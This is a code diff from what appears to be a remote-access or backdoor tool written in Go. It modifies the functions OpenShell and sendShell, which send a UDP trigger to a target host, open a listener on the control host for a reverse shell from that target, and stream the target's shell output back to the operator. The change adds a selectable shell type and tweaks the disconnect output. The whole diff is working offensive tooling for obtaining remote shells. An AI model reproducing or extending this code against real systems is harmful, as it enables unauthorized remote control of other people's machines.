@@ -105,7 +105,7 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 }
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
-func OpenShell(udpTarget, targetIP, targetPort string) error {
+func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
 	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
 	srcPort := strconv.Itoa(rand.Intn(45000) + 10000)
@@ -135,7 +135,7 @@ func OpenShell(udpTarget, targetIP, targetPort string) error {
 	}()
 
 	// Listener is running in the background, so we can send the message to the target
-	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort); err != nil {
+	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort, shellType); err != nil {
 		return fmt.Errorf("sending shell message: %w", err)
 	}
 
@@ -161,7 +161,7 @@ func OpenShell(udpTarget, targetIP, targetPort string) error {
 	// Stream incoming target shell output to control terminal
 	go func() {
 		_, _ = io.Copy(os.Stdout, conn)
-		fmt.Println("\n[-] Target disconnected.")
+		fmt.Println("\r\n[-] Target disconnected.\r\n")
 		close(done)
 	}()
 
@@ -176,7 +176,7 @@ func OpenShell(udpTarget, targetIP, targetPort string) error {
 }
 
 // sendShell sends a shell message to the target host
-func sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
+func sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort string, shellType message.ShellType) error {
 	// Join the IP and port
 	addr := net.JoinHostPort(udpTarget, targetPort)
 
@@ -189,7 +189,7 @@ func sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 
 	// Create message struct
 	msg := &message.Message{
-		Type:    message.Shell,
+		Type:    message.MessageType(shellType),
 		DstIP:   targetIP,
 		DstPort: targetPort,
 		SrcIP:   srcIP,
